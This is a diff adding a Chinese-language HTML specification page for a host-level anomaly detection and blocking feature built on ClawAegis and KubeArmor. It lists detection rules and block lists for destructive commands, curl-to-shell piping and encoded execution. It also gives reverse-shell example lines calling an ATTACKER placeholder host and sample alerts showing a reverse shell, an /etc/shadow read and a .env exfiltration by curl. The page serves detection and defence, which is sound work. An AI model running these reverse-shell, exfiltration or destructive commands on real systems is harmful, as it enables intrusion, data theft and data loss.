@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>fr31</title>
+<link rel="stylesheet" href="../css-5.5.css">
+</head>
+<body>
+<div class="main-content">
+<div class="page-section" id="page-fr31">
+
+      <div class="subheader">
+    <span>FR-31</span><span style="opacity:.3">|</span>
+    <strong>主机级异常行为检测与实时阻断</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-p0">P0 优先级</span>
+  </div>
+  <div class="content-area">
+
+    <div class="tabs" data-tabgroup="fr31">
+      <div class="tab active" data-tab="fr31-rules">检测规则</div>
+      <div class="tab" data-tab="fr31-reverse">反弹Shell检测</div>
+      <div class="tab" data-tab="fr31-exfil">异常外联检测</div>
+      <div class="tab" data-tab="fr31-alert">实时告警</div>
+    </div>
+
+    <!-- ══════════════ Tab: 检测规则 ══════════════ -->
+    <div class="tab-content active" id="fr31-rules">
+
+      <!-- 面板1: ClawAegis高危命令模式 -->
+      <div class="section-title">ClawAegis 高危命令模式 <span style="font-size:.75rem;font-weight:400;color:var(--text);margin-left:8px;">16 条规则</span></div>
+
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">rm -rf /</span><span class="badge badge-critical">破坏性</span></div>
+        <div class="rule-desc">递归删除根目录</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">rm -rf /*</span><span class="badge badge-critical">破坏性</span></div>
+        <div class="rule-desc">递归删除通配符</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">curl | sh/bash</span><span class="badge badge-critical">远程执行</span></div>
+        <div class="rule-desc">curl管道执行</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">wget | sh/bash</span><span class="badge badge-critical">远程执行</span></div>
+        <div class="rule-desc">wget管道执行</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">| sh/bash</span><span class="badge badge-high">管道执行</span></div>
+        <div class="rule-desc">管道Shell执行</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">while true; do</span><span class="badge badge-high">资源耗尽</span></div>
+        <div class="rule-desc">无限循环</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">while [ 1 ]; do</span><span class="badge badge-high">资源耗尽</span></div>
+        <div class="rule-desc">条件无限循环</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">for ((;;)); do</span><span class="badge badge-high">资源耗尽</span></div>
+        <div class="rule-desc">C风格无限循环</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">Shell配置覆写</span><span class="badge badge-high">配置篡改</span></div>
+        <div class="rule-desc">覆写 .bashrc, .zshrc, .profile 等用户Shell配置文件</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">系统配置覆写</span><span class="badge badge-critical">配置篡改</span></div>
+        <div class="rule-desc">覆写 /etc/profile, /etc/environment 等系统级配置文件</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">shutdown</span><span class="badge badge-critical">系统破坏</span></div>
+        <div class="rule-desc">系统关机</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">poweroff</span><span class="badge badge-critical">系统破坏</span></div>
+        <div class="rule-desc">断电关机</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">halt</span><span class="badge badge-critical">系统破坏</span></div>
+        <div class="rule-desc">系统停机</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">reboot</span><span class="badge badge-high">系统破坏</span></div>
+        <div class="rule-desc">系统重启</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">init 0/6</span><span class="badge badge-high">系统破坏</span></div>
+        <div class="rule-desc">运行级别切换</div>
+      </div>
+      <div class="rule-card">
+        <div class="rule-header"><span class="rule-flag">mkfs / diskutil eraseDisk / format</span><span class="badge badge-critical">破坏性</span></div>
+        <div class="rule-desc">磁盘格式化</div>
+      </div>
+
+      <!-- 面板2: 编码混淆检测 -->
+      <div class="section-title mt-20">ClawAegis 编码混淆检测 <span style="font-size:.75rem;font-weight:400;color:var(--text);margin-left:8px;">14 种模式</span></div>
+
+      <div class="rule-card-group">
+        <div class="group-label">编码管道执行 <span class="group-count">4</span></div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">base64-pipe-exec</span></div>
+          <div class="rule-desc">Base64解码管道至Shell执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">hex-pipe-exec</span></div>
+          <div class="rule-desc">十六进制解码管道至Shell执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">printf-pipe-exec</span></div>
+          <div class="rule-desc">printf转义序列管道至Shell</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">curl-pipe-shell</span></div>
+          <div class="rule-desc">远程下载管道至Shell执行</div>
+        </div>
+      </div>
+
+      <div class="rule-card-group">
+        <div class="group-label">解码执行 <span class="group-count">2</span></div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">eval-decode</span></div>
+          <div class="rule-desc">eval解码执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">command-substitution-decode-exec</span></div>
+          <div class="rule-desc">命令替换解码执行</div>
+        </div>
+      </div>
+
+      <div class="rule-card-group">
+        <div class="group-label">远程执行 <span class="group-count">2</span></div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">process-substitution-remote-exec</span></div>
+          <div class="rule-desc">进程替换远程执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">source-process-substitution-remote</span></div>
+          <div class="rule-desc">source进程替换远程加载</div>
+        </div>
+      </div>
+
+      <div class="rule-card-group">
+        <div class="group-label">脚本注入 <span class="group-count">4</span></div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">shell-heredoc-exec</span></div>
+          <div class="rule-desc">Heredoc脚本注入执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">python-exec-encoded</span></div>
+          <div class="rule-desc">Python编码执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">node-exec-encoded</span></div>
+          <div class="rule-desc">Node.js编码执行</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">powershell-encoded</span></div>
+          <div class="rule-desc">PowerShell编码命令</div>
+        </div>
+      </div>
+
+      <div class="rule-card-group">
+        <div class="group-label">混淆技术 <span class="group-count">2</span></div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">octal-escape</span></div>
+          <div class="rule-desc">八进制转义混淆</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">hex-escape</span></div>
+          <div class="rule-desc">十六进制转义混淆</div>
+        </div>
+        <div class="rule-card">
+          <div class="rule-header"><span class="rule-flag">var-expansion-obfuscation</span></div>
+          <div class="rule-desc">变量展开混淆</div>
+        </div>
+      </div>
+
+      <!-- 面板3: KubeArmor监控syscall -->
+      <div class="section-title mt-20">KubeArmor 监控系统调用 (eBPF)</div>
+      <div class="grid-2">
+        <!-- 左列: 文件(syscall) -->
+        <div class="kprobe-col">
+          <div class="kp-title">文件系统 (syscall)</div>
+          <div class="kp-item"><code>open</code><span class="kp-desc">打开文件</span></div>
+          <div class="kp-item"><code>openat</code><span class="kp-desc">打开文件(at)</span></div>
+          <div class="kp-item"><code>unlink</code><span class="kp-desc">删除文件</span></div>
+          <div class="kp-item"><code>unlinkat</code><span class="kp-desc">删除文件(at)</span></div>
+          <div class="kp-item"><code>rmdir</code><span class="kp-desc">删除目录</span></div>
+
+          <div class="kp-title" style="margin-top:16px;">进程/网络 (kprobe)</div>
+          <div class="kp-item"><code>execve</code><span class="kp-type">进程</span><span class="kp-desc">执行程序</span></div>
+          <div class="kp-item"><code>execveat</code><span class="kp-type">进程</span><span class="kp-desc">执行程序(at)</span></div>
+          <div class="kp-item"><code>socket</code><span class="kp-type">网络</span><span class="kp-desc">创建套接字</span></div>
+          <div class="kp-item"><code>connect</code><span class="kp-type">网络</span><span class="kp-desc">发起连接</span></div>
+          <div class="kp-item"><code>bind</code><span class="kp-type">网络</span><span class="kp-desc">绑定地址</span></div>
+          <div class="kp-item"><code>listen</code><span class="kp-type">网络</span><span class="kp-desc">监听连接</span></div>
+
+          <div class="kp-title" style="margin-top:16px;">权限控制 (kprobe)</div>
+          <div class="kp-item"><code>ptrace</code><span class="kp-desc">进程追踪</span></div>
+          <div class="kp-item"><code>chown</code><span class="kp-desc">修改所有者</span></div>
+          <div class="kp-item"><code>setuid</code><span class="kp-desc">设置用户ID</span></div>
+          <div class="kp-item"><code>setgid</code><span class="kp-desc">设置组ID</span></div>
+          <div class="kp-item"><code>fchownat</code><span class="kp-desc">修改所有者(at)</span></div>
+
+          <div class="kp-title" style="margin-top:16px;">系统操作 (kprobe)</div>
+          <div class="kp-item"><code>mount</code><span class="kp-desc">挂载文件系统</span></div>
+          <div class="kp-item"><code>umount</code><span class="kp-desc">卸载文件系统</span></div>
+        </div>
+
+        <!-- 右列: Security kprobes -->
+        <div class="kprobe-col">
+          <div class="kp-title">Security kprobes</div>
+          <div class="kp-item"><code>do_exit</code><span class="kp-type">kprobe</span><span class="kp-desc">进程退出</span></div>
+          <div class="kp-item"><code>security_bprm_check</code><span class="kp-type">kprobe</span><span class="kp-desc">可执行文件检查</span></div>
+          <div class="kp-item"><code>security_file_open</code><span class="kp-type">kprobe</span><span class="kp-desc">文件打开安全检查</span></div>
+          <div class="kp-item"><code>security_path_mknod</code><span class="kp-type">kprobe</span><span class="kp-desc">创建文件节点检查</span></div>
+          <div class="kp-item"><code>security_path_unlink</code><span class="kp-type">kprobe</span><span class="kp-desc">删除文件安全检查</span></div>
+          <div class="kp-item"><code>security_path_rmdir</code><span class="kp-type">kprobe</span><span class="kp-desc">删除目录安全检查</span></div>
+          <div class="kp-item"><code>security_ptrace_access_check</code><span class="kp-type">kprobe</span><span class="kp-desc">ptrace访问检查</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════ Tab: 反弹Shell检测 ══════════════ -->
+    <div class="tab-content" id="fr31-reverse">
+
+      <!-- 面板1: 检测模式 -->
+      <div class="section-title">反弹Shell检测模式</div>
+
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">Bash 反弹</div>
+        <div class="code-block"><span class="str">bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">NC 反弹</div>
+        <div class="code-block"><span class="str">nc -e /bin/sh ATTACKER PORT</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">Python 反弹</div>
+        <div class="code-block"><span class="str">python -c 'import socket,subprocess,os;...'</span></div>
+      </div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">PowerShell 反弹</div>
+        <div class="code-block"><span class="str">pwsh -e &lt;base64 encoded&gt;</span></div>
+      </div>
+
+      <!-- 面板2: KubeArmor网络kprobe -->
+      <div class="section-title mt-20">KubeArmor 网络 kprobe</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>kprobe</th><th>类型</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>tcp_connect</code></td><td><span class="badge badge-sys">kprobe</span></td><td>出站TCP连接</td></tr>
+            <tr><td><code>inet_csk_accept</code></td><td><span class="badge badge-observe">kretprobe</span></td><td>入站TCP连接</td></tr>
+            <tr><td><code>udp_sendmsg</code></td><td><span class="badge badge-sys">kprobe</span></td><td>UDP发送</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- 面板3: 检测率目标 -->
+      <div class="section-title mt-20">检测率目标</div>
+      <div class="app-panel-warm app-panel">
+        <div class="score-display">
+          <div class="score-circle-lg score-high-lg">
+            <span class="snum">95%</span>
+            <span class="slabel">DETECTION</span>
+          </div>
+          <div style="flex:1">
+            <div style="font-size:1rem;font-weight:700;color:var(--text-h);margin-bottom:6px;">反弹Shell检测率 &ge; 95%</div>
+            <div class="text-sm" style="color:var(--text);line-height:1.7;">基于已知反弹Shell模式的正则匹配 + eBPF网络连接监控双重检测，覆盖 Bash / NC / Python / PowerShell / Perl / Ruby 等主流反弹手法。ClawAegis 命令模式检测覆盖已知特征，KubeArmor tcp_connect kprobe 覆盖未知反弹Shell的网络行为。</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════ Tab: 异常外联检测 ══════════════ -->
+    <div class="tab-content" id="fr31-exfil">
+
+      <!-- 面板1: ClawAegis外联模式 -->
+      <div class="section-title">ClawAegis 外联模式</div>
+
+      <div class="sub-title">直接执行型 (OUTBOUND_EXEC_PATTERNS)</div>
+      <div class="app-panel mb-12">
+        <div class="tag-list">
+          <span class="tag">curl</span><span class="tag">wget</span><span class="tag">fetch()</span>
+          <span class="tag">requests.post</span><span class="tag">ping</span><span class="tag">nc</span>
+          <span class="tag">netcat</span><span class="tag">ssh</span><span class="tag">scp</span>
+          <span class="tag">nslookup</span><span class="tag">dig</span><span class="tag">host</span>
+        </div>
+      </div>
+
+      <div class="sub-title">脚本运行时型 (OUTBOUND_SCRIPT_EXEC_PATTERNS)</div>
+      <div class="app-panel mb-12">
+        <table class="data-table">
+          <thead><tr><th>运行时</th><th>模式</th></tr></thead>
+          <tbody>
+            <tr><td>PowerShell</td><td><code>Invoke-WebRequest</code>, <code>Invoke-RestMethod</code>, <code>IWR</code>, <code>IRM</code></td></tr>
+            <tr><td>Python</td><td><code>requests.get/post/...</code>, <code>urllib.request.urlopen</code>, <code>httpx.get/post/...</code></td></tr>
+            <tr><td>Node/Bun/Deno</td><td><code>fetch("https://...")</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">web_fetch 工具</div>
+        <div class="text-sm">web_fetch 工具调用始终被分类为出站 (outbound)，无论参数内容。</div>
+      </div>
+
+      <!-- 面板2: 链式决策逻辑 -->
+      <div class="section-title mt-20">外泄链决策逻辑</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>条件</th><th>决策</th><th>阻断</th></tr></thead>
+          <tbody>
+            <tr><td><code>hasSink &amp;&amp; matchedSecretVariants &gt; 0</code></td><td><span class="badge badge-blocked">direct-secret-exfiltration</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td><code>currentSink &amp;&amp; prevServiceScript &amp;&amp; prevOutbound</code></td><td><span class="badge badge-blocked">legacy-service-script-chain</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td><code>hasSink &amp;&amp; hasSource &amp;&amp; hasTransform</code></td><td><span class="badge badge-blocked">high-confidence-chain</span></td><td><strong style="color:#dc2626">YES</strong></td></tr>
+            <tr><td><code>hasSink &amp;&amp; (hasSource || hasTransform)</code></td><td><span class="badge badge-observed">partial-chain</span></td><td style="color:#9ca3af">NO</strong></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- 面板3: KubeArmor nftables -->
+      <div class="section-title mt-20">KubeArmor NetworkPolicyEnforcer nftables 链</div>
+      <div class="app-panel">
+        <div class="code-block"><span class="cm"># nftables chains managed by KubeArmor</span>
+<span class="kw">ip</span> kubearmor INPUT   (priority <span class="num">0</span>)
+<span class="kw">ip</span> kubearmor OUTPUT  (priority <span class="num">0</span>)
+<span class="kw">ip6</span> kubearmor INPUT  (priority <span class="num">0</span>)
+<span class="kw">ip6</span> kubearmor OUTPUT (priority <span class="num">0</span>)
+
+<span class="cm"># nflog monitoring: 1 log per 10s per flow</span></div>
+      </div>
+    </div>
+
+    <!-- ══════════════ Tab: 实时告警 ══════════════ -->
+    <div class="tab-content" id="fr31-alert">
+      <div class="section-title">实时告警</div>
+
+      <!-- 1. CRITICAL 反弹Shell -->
+      <div class="log-entry" style="border-left:4px solid #7f1d1d">
+        <div class="log-header">
+          <span class="badge badge-critical">CRITICAL</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 14:23:17</span>
+          <span class="log-id">EVT-0001</span>
+        </div>
+        <div class="log-body"><strong>反弹Shell</strong> — <code>bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444</code></div>
+        <div class="log-detail">source: KubeArmor tcp_connect | remote: 10.0.0.99:4444 | action: BLOCKED | rule: EnforceNetConnect</div>
+        <div class="log-chain">
+          <span class="log-chain-step">exec(bash -i...)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">tcp_connect</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <!-- 2. HIGH 敏感文件访问 -->
+      <div class="log-entry" style="border-left:4px solid #ef4444">
+        <div class="log-header">
+          <span class="badge badge-high">HIGH</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 14:18:45</span>
+          <span class="log-id">EVT-0002</span>
+        </div>
+        <div class="log-body"><strong>敏感文件访问</strong> — <code>/etc/shadow</code> read by pid:28451</div>
+        <div class="log-detail">source: KubeArmor security_file_open | resource: /etc/shadow | operation: File | action: Audit | severity: 8</div>
+      </div>
+
+      <!-- 3. HIGH 异常外联 -->
+      <div class="log-entry" style="border-left:4px solid #ef4444">
+        <div class="log-header">
+          <span class="badge badge-high">HIGH</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 14:12:03</span>
+          <span class="log-id">EVT-0003</span>
+        </div>
+        <div class="log-body"><strong>异常外联</strong> — <code>curl to unregistered-domain.com</code></div>
+        <div class="log-detail">source: ClawAegis exfiltration_guard | command: curl https://unregistered-domain.com | action: BLOCKED | reason: exfiltration-chain</div>
+        <div class="log-chain">
+          <span class="log-chain-step">read(.env)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">source:secret-reference</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">curl(outbound)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <!-- 4. MEDIUM 可疑编码命令 -->
+      <div class="log-entry" style="border-left:4px solid #f59e0b">
+        <div class="log-header">
+          <span class="badge badge-medium">MEDIUM</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 13:55:22</span>
+          <span class="log-id">EVT-0004</span>
+        </div>
+        <div class="log-body"><strong>可疑编码命令</strong> — <code>echo bXNn | base64 -d | bash</code></div>
+        <div class="log-detail">source: ClawAegis command_obfuscation_guard | matched: base64-pipe-exec | decoded: "msg" | action: BLOCKED</div>
+      </div>
+
+      <!-- 5. LOW 网络扫描 -->
+      <div class="log-entry" style="border-left:4px solid #3b82f6">
+        <div class="log-header">
+          <span class="badge badge-low">LOW</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 13:40:08</span>
+          <span class="log-id">EVT-0005</span>
+        </div>
+        <div class="log-body"><strong>网络扫描</strong> — <code>nmap syn scan from container</code></div>
+        <div class="log-detail">source: KubeArmor EnforceNetConnect | protocol: TCP | src: 10.0.1.55:54321 | dst: 10.0.0.1:443 | action: Audit</div>
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+</div>
+<script>
+
+// Tab switching (event delegation)
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('tab')) {
+    var tabId = e.target.getAttribute('data-tab');
+    if (!tabId) return;
+    var tabContainer = e.target.parentElement;
+    tabContainer.querySelectorAll('.tab').forEach(function(t) {
+      t.classList.remove('active');
+    });
+    e.target.classList.add('active');
+    var contentParent = tabContainer.parentElement;
+    contentParent.querySelectorAll('.tab-content').forEach(function(tc) {
+      tc.classList.remove('active');
+    });
+    var targetContent = document.getElementById('tab-' + tabId);
+    if (targetContent) targetContent.classList.add('active');
+  }
+});
+
+// Mode selector (event delegation)
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('mode-btn')) {
+    var selector = e.target.parentElement;
+    selector.querySelectorAll('.mode-btn').forEach(function(b) {
+      b.classList.remove('active-enforce', 'active-observe', 'active-off');
+    });
+    var mode = e.target.getAttribute('data-mode');
+    if (mode === 'enforce') e.target.classList.add('active-enforce');
+    else if (mode === 'observe') e.target.classList.add('active-observe');
+    else if (mode === 'off') e.target.classList.add('active-off');
+  }
+});
+
+</script>
+</body>
+</html>
